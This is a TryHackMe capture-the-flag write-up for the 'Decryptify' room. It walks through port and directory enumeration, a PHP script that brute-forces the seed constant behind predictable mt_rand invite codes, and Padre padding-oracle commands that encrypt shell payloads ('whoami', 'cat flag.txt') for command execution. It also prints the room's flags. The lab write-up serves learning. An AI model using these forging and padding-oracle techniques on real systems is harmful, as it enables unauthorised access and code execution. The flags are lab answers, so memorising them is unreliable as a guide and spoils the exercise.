# Decryptify

**Platform:** TryHackMe

**Date:** 2026-09-15

**Difficulty:** Medium

**Category:** Web / Cryptography

**Room URL:** `https://tryhackme.com/room/decryptify`

**Status:** ✅ Completed

---

## 📌 What Was This Room About?

This room was mainly about web enumeration, predictable invitation code generation, API analysis, and cryptographic vulnerabilities.

During the room, I found a predictable invitation-code system and then exploited an **Oracle Padding Attack** to eventually achieve command execution and retrieve the final flag.

---

## 🔍 Reconnaissance

As usual, I started with recon to see what ports were open.

### Nmap Scan

I first ran a full TCP port scan:

```bash
nmap -sS -p- -T4 TARGET_IP
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|—|SSH|
|1337|HTTP|—|Web application|

I then ran another scan with service detection, default scripts, and HTTP enumeration:

```bash
nmap -sC -sV --script=http-enum TARGET_IP
```

**Results:**

- Port `22` — SSH
    
- Port `1337` — HTTP
    
- Apache `2.4.41` was running on port `1337`
    
- `/logs` was discovered
    

The `/logs` directory immediately caught my attention because logs sometimes contain information that shouldn't be publicly accessible.

---

## 🧭 Steps I Took

### Step 1 — Directory Enumeration

- **What I did:**  
    I used Gobuster against the web server on port `1337` to find hidden directories and files.
    
- **Command/Tool used:**
    

```bash
gobuster dir -u http://TARGET_IP:1337 -w /path/to/wordlist
```

- **What I found:**
    

```text
/logs
/api.js
/dashboard.php
```

`/dashboard.php` required authentication, so I started looking at the other files to understand how the application worked.

- **Why it matters:**  
    Finding JavaScript files and forgotten directories can reveal application logic, credentials, API functionality, or other information that isn't visible from the main page.
    

---

### Step 2 — Investigating the Login Page

I opened the web application and found a simple login page.

I then inspected the page source and noticed that it was loading:

```html
<script src="api.js"></script>
```

So instead of just staring at the login form, I went straight for the JavaScript because it could tell me how the application handled authentication.

- **What I found:**  
    `api.js` was heavily obfuscated.
    
- **Why it matters:**  
    Client-side JavaScript shouldn't automatically be trusted just because it's obfuscated. If the browser needs to execute it, I can usually retrieve and analyze it.
    

---

### Step 3 — Deobfuscating `api.js`

I used a JavaScript deobfuscator to make the code easier to understand.

After deobfuscating it, I noticed that a function was repeatedly mixing data in an array called `k`.

The function performed the operation:

```text
934,896 times
```

and eventually assigned the value at index `4` to a variable called:

```text
c
```

The important part was that the number of operations was constant.

That meant the result was deterministic.

To confirm this, I added:

```javascript
console.log("c=", c)
```

to the end of the script and ran it in the browser console.

- **What I found:**  
    I was able to calculate the same value of `c`.
    

I initially thought this value could be used directly as an invitation code, but it didn't work.

So I moved on to the API functionality.

---

### Step 4 — Finding the Invitation Code Algorithm

Inside the API dashboard, I found the function responsible for generating invitation codes.

The PHP code essentially did this:

1. Take the user's email.
    
2. Calculate the email length.
    
3. Take the hexadecimal representation of the first 8 characters.
    
4. Combine these values with a `constant_value`.
    
5. Use the result as the seed for `mt_srand()`.
    
6. Generate a number with `mt_rand()`.
    
7. Base64-encode the number.
    

The important thing was that the random number wasn't actually random.

For the same input values, the same seed would be generated, meaning `mt_rand()` would produce the same output.

- **Why it matters:**  
    If an application uses predictable values to generate invitation codes, I may be able to reproduce valid codes without having access to the original generation process.
    

---

## 💥 Exploitation Phase

### Step 5 — Recreating the Invitation Generator

Knowing how the invitation system worked, I recreated the algorithm in PHP.

I initially assumed that the `constant_value` was related to the number of times the JavaScript function performed its mixing operation.

I used PHP to test the algorithm and output the generated invitation code.

```php
<?php

$email = "alpha@fake.thm";
$constant_value = 99999;

$email_length = strlen($email);
$email_hex = hexdec(substr($email, 0, 8));

$seed_value = hexdec($email_length + $constant_value + $email_hex);

mt_srand($seed_value);
$random = mt_rand();

$invite_code = base64_encode($random);

echo $invite_code;

?>
```

At first, I tried using the generated invitation code with a new user.

It didn't work.

So I needed to find an existing user whose information I could use to verify whether my calculation was correct.

And then I remembered the `/logs` directory.

---

### Step 6 — Finding Users in `/logs`

I opened the `/logs` directory and found information about two users:

```text
alpha@fake.thm
hello@fake.thm
```

The interesting part was:

- `alpha@fake.thm` had an invitation code, but the account was disabled.
    
- `hello@fake.thm` existed, but no invitation code was shown.
    

I used `alpha@fake.thm` to test my invitation-code generator.

However, the code my script generated didn't match the code shown in the logs.

So my assumption about `constant_value` was wrong.

This meant I had to find the correct value.

---

### Step 7 — Brute-Forcing `constant_value`

Because I already knew the email and the expected random value, I could brute-force the unknown `constant_value`.

The invitation code in the logs decoded to:

```text
1348337122
```

So I wrote my own PHP script to test possible values until it found the one that generated that exact number.

```php
<?php

$email = "alpha@fake.thm";
$desired_random = 1348337122;

// Function to find constant_value by brute force
function find_constant_value($email, $desired_random) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    
    // Probable range for constant_value
    for ($constant_value = 0; $constant_value <= 9999999; $constant_value++) {
        $seed_value = hexdec($email_length + $constant_value + $email_hex);
        mt_srand($seed_value);
        $random = mt_rand();
        
        if ($random == $desired_random) {
            return $constant_value;
        }
    }

    return null;
}

$found_constant = find_constant_value($email, 1348337122);

if ($found_constant !== null) {
    echo "Constant_value found!: " . $found_constant . "\n";
    
    // Verify
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));

    $seed_value = hexdec($email_length + $found_constant + $email_hex);

    mt_srand($seed_value);
    $random = mt_rand();

    $invite_code = base64_encode($random);

    echo "Verification - Invite code: " . $invite_code . "\n";
} else {
    echo "Constant_value was not found in the range\n";
}

?>
```

The script went through possible values and checked whether the generated random number matched:

```text
1348337122
```

Eventually, I found:

```text
constant_value = 99999
```

That was the value I was looking for.

- **Why it matters:**  
    Because `mt_srand()` is deterministic, finding the correct seed calculation allowed me to reproduce the application's supposedly random invitation codes.
    

---

### Step 8 — Generating the Code for `hello@fake.thm`

Now that I knew the correct constant was:

```text
99999
```

I changed the email in my script to:

```text
hello@fake.thm
```

and generated the invitation code.

This time, it worked.

I was able to access the dashboard and retrieve the first flag:

```text
THM{CryptographyPwn007}
```

---

### Step 9 — Investigating the `date` Parameter

After getting into the dashboard, I continued exploring instead of stopping after the first flag.

While inspecting the source code, I noticed a hidden form containing a parameter called:

```text
date
```

The form was using **GET**, meaning the value could be passed through the URL query string.

There were two things that immediately looked strange:

- Changing the case of a character caused the displayed `2025` value to disappear.
    
- The value changed whenever the page was refreshed.
    

That made me suspect that `2025` wasn't simply hardcoded.

I modified the parameter manually in the URL.

The application then returned an error involving:

```text
openssl_decrypt()
```

and incorrect padding.

That was a huge clue.

---

### Step 10 — Identifying the Padding Oracle

The error indicated that the application was decrypting the value supplied through the `date` parameter.

More importantly, the application was effectively giving me information about whether the decrypted data had valid padding.

That made me realize the endpoint was vulnerable to an **Oracle Padding Attack**.

A padding-oracle attack works by modifying encrypted data and observing how the server responds.

If the application tells me whether the resulting padding is valid or invalid, that response can be used to gradually recover information about the encrypted plaintext.

- **What I found:**  
    The `date` parameter was encrypted and processed by `openssl_decrypt()`.
    
- **Why it matters:**  
    The application's padding response was leaking information about the ciphertext, giving me an oracle that could be abused.
    

---

### Step 11 — Using Padre

Instead of manually performing the padding-oracle attack byte-by-byte, I used **Padre** to automate the process.

My command was:

```bash
./padre-linux-amd64 -u 'http://10.10.74.77:1337/dashboard.php?date=$' -cookie 'PHPSESSID=rh2mqdvnovuvalr8dr0p9iponq; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' 'X5y9AuOQnrgPgEfZSZUKf88RRR86q6mNoQad/KVieqg='
```

The important arguments were:

- `-u` — specifies the vulnerable URL and the parameter Padre should manipulate.
    
- `-cookie` — supplies the session cookies required to access the dashboard.
    
- The final value — provides the valid padding value.
    

Running the command confirmed that the application was vulnerable.

---

### Step 12 — Testing for Command Execution

Now I wanted to see how far I could take the vulnerability.

Padre has an `-enc` option that allows me to encrypt a value using the recovered information.

I tested it with:

```bash
./padre-linux-amd64 -u 'http://10.10.74.77:1337/dashboard.php?date=$' -cookie 'PHPSESSID=rh2mqdvnovuvalr8dr0p9iponq; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -enc 'whoami'
```

The tool generated a value that I could put into the:

```text
date=
```

parameter.

After sending it to the application, the response showed:

```text
www-data
```

So I had confirmed **command execution as `www-data`**.

This was the point where the cryptographic vulnerability became much more serious.

---

### Step 13 — Reading the Final Flag

Since I had command execution, I used the same technique to read the flag file.

```bash
./padre-linux-amd64 -u 'http://10.10.74.77:1337/dashboard.php?date=$' -cookie 'PHPSESSID=rh2mqdvnovuvalr8dr0p9iponq; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -enc 'cat /home/ubuntu/flag.txt'
```

This generated another encrypted value.

I inserted it into the `date=` parameter and the application returned the contents of:

```text
/home/ubuntu/flag.txt
```

The final flag was:

```text
THM{GOT_COMMAND_EXECUTION001}
```

And that completed the room.

---

## 🛠 Commands Used

|Command|What It Does|
|---|---|
|`nmap -sS -p- -T4 TARGET_IP`|Performs a full TCP port scan|
|`nmap -sC -sV --script=http-enum TARGET_IP`|Enumerates services, versions, and HTTP information|
|`gobuster dir -u URL -w WORDLIST`|Finds hidden directories and files|
|`mt_srand()`|Seeds PHP's pseudo-random number generator|
|`mt_rand()`|Generates a pseudo-random number|
|`base64_encode()`|Base64-encodes a value|
|`./padre-linux-amd64`|Automates padding-oracle attacks|
|`whoami`|Shows the current user|
|`cat /home/ubuntu/flag.txt`|Reads the final flag|

---

## 🚩 Flags Found

|Flag|Value|
|---|---|
|Panel flag|`THM{CryptographyPwn007}`|
|Final flag|`THM{GOT_COMMAND_EXECUTION001}`|

---

## 💡 What I Learned

- **Predictable randomness is not secure randomness.** If an application uses predictable information to seed `mt_srand()`, I can potentially reproduce values that are supposed to be random.
    
- **Client-side JavaScript can reveal important application logic.** The obfuscated `api.js` looked annoying at first, but once I deobfuscated it, I could understand what it was doing and reproduce its output.
    
- **Brute force becomes much more useful when I already know what the correct output should be.** Since I had the invitation code from `/logs`, I could use it as a known value to find the unknown `constant_value`.
    
- **Exposed logs are dangerous.** The `/logs` directory gave me existing usernames and an invitation code, which gave me exactly the information I needed to continue.
    
- **Padding errors can leak cryptographic information.** The `openssl_decrypt()` padding error was the clue that led me to the Oracle Padding Attack.
    
- **A cryptographic vulnerability can eventually become command execution.** What started as manipulating an encrypted `date` parameter eventually allowed me to make the application execute commands as `www-data`.
    
- **Tools are useful, but understanding the vulnerability is more important.** Padre automated the padding-oracle process, but I still needed to understand why the endpoint was vulnerable and what the tool was doing.
    

---

## ❓ What Confused Me / What to Research Next

- At first, I assumed the `constant_value` was related to the JavaScript mixing count, but the invitation code didn't match. I had to go back and use the known value from `/logs` to brute-force the correct constant.
    
- I want to learn how to perform a **CBC padding-oracle attack manually**, instead of depending entirely on Padre.
    
- I also want to research how applications properly prevent padding-oracle vulnerabilities, especially with authenticated encryption such as **AES-GCM**.
    

---

## 🔗 Linked Notes

- [Nmap](https://chatgpt.com/c/Nmap)
    
- [Gobuster](https://chatgpt.com/c/Gobuster)
    
- [Web Enumeration](https://chatgpt.com/c/Web%20Enumeration)
    
- [PHP](https://chatgpt.com/c/PHP)
    
- [Cryptography](https://chatgpt.com/c/Cryptography)
    
- [Padding Oracle Attack](https://chatgpt.com/c/Padding%20Oracle%20Attack)
    
- [Command Execution](https://chatgpt.com/c/Command%20Execution)
    

---

## 📎 Resources Used

- TryHackMe — Decryptify
    
- Padre — Padding Oracle Attack tool
    
- JavaScript deobfuscation tool
    
- PHP documentation
    
- My own PHP brute-force script
    

---